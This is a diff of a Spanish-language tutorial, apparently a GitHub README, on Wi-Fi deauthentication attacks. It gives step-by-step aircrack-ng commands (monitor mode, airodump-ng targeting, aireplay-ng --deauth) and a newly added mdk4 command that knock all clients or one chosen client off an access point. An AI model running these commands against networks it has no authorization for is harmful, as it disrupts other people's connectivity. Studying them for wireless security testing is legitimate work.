@@ -13,7 +13,7 @@ En el siguiente esquema se observa como el `Atacante` envía solicitudes masivas
 
 <h1 align="center"></h1>
 
-### Aircrack-ng
+### AIRCRACK-NG
 
 Existen infinidades de herramientas para realizar este ataque, una de las más conocidas es la suite de Aircrack-ng, ya viene incorporada en distribuciones basadas en Debian como lo es Kali Linux y Parrot OS.
 
@@ -24,15 +24,15 @@ sudo apt-get install aircrack-ng
 
 Pero antes que nada hay que reconocer la dirección MAC del objetivo (AP) y para ello es necesario poner nuestra tarjeta de red en modo monitor. Esto permitirá escuchar y capturar todos los paquetes que viajan en el aire.
 ```
-ifconfig wlan0 down
-iwconfig wlan0 mode monitor
-ifconfig wlan0 up
+ifconfig <INTERFAZ> down
+iwconfig <INTERFAZ> mode monitor
+ifconfig <INTERFAZ> up
 ```
 ![1](https://user-images.githubusercontent.com/75953873/180204632-77b2796f-52ba-4f03-8749-f3ce83a16a47.png)
 
 Si lo prefieren automatizado:
 ```
-airmon-ng start wlan0
+airmon-ng start <INTERFAZ>
 ```
 ![2](https://user-images.githubusercontent.com/75953873/180204828-ea12756e-4daf-4041-95e7-337f19969bd7.png)
 
@@ -74,13 +74,13 @@ airodump-ng wlan0
 
 Luego de reconocer el BSSID y el canal, quedaría capturar los paquetes del AP objetivo:
 ```
-airodump-ng -c <N-CHANNEL> --bssid <MAC-AP> wlan0
+airodump-ng -c <N-CHANNEL> --bssid <MAC-AP> <INTERFAZ>
 ```
 ![6](https://user-images.githubusercontent.com/75953873/180209382-2b325c19-3b9c-4fc9-8395-91d46da5fb16.png)
 
 La `STATION` son los clientes que están conectados la red (BSSID). En otra terminal proseguiremos a lanzar el ataque de desautenticación para desconectarlos:
 ```
-aireplay-ng --deauth <SEGUNDOS> -a <MAC-AP> wlan0
+aireplay-ng --deauth <SEGUNDOS> -a <MAC-AP> <INTERFAZ>
 ```
 ![7](https://user-images.githubusercontent.com/75953873/180210826-d42ea7a3-8a7a-49aa-9f9a-bedbcc510d1c.png)
 
@@ -88,9 +88,38 @@ Al específicar el tiempo en `0` el ataque será ilimitado, el párametro `a` es
 
 El ejemplo anterior desconectará a todos los dispositivos de la red. Ahora, si quisieramos desautenticar a un dispositivo en específico utilizamos el parámetro `-c` **+** la dirección `MAC` del dispositivo (**STATION**).
 ```
-aireplay-ng --deauth <SEGUNDOS> -a <MAC-AP> -c <MAC> wlan0
+aireplay-ng --deauth <SEGUNDOS> -a <MAC-AP> -c <MAC> <INTERFAZ>
 ```
 ![8](https://user-images.githubusercontent.com/75953873/180893744-86724669-affe-45b6-a424-9e0d77e0315e.png)
+
+<h1 align="center"></h1>
+
+### MDK3
+
+Mdk4 es la nueva actualización de Mdk3. Es una herramienta para pruebas de de Wi-Fi desarrollada por el propio proyecto de aircrack-ng.
+
+**Instalar en Debian:**
+```
+sudo apt install mdk4
+```
+
+Mdk4 contiene distintos parámetros con subparámetros de ataques, entre ellos, desautenticación:
+
+**d:** Modo desautenticación
+
+**-c:** Salto de canal.
+
+**-E:** Nombre del punto de acceso (ESSID).
+
+**-B:** Dirección MAC del punto de acceso (BSSID).
+
+**-S:** Dirección MAC del cliente (STATION).
+
+Expulsar a todos los clientes de la red:
+```
+mdk4 <INTERFAZ> d -c 1,6,10 -E <ESSID>
+```
+![9](https://user-images.githubusercontent.com/75953873/181661574-1a550111-38a0-4d4f-bed4-753d690892d7.png)
 
 
 
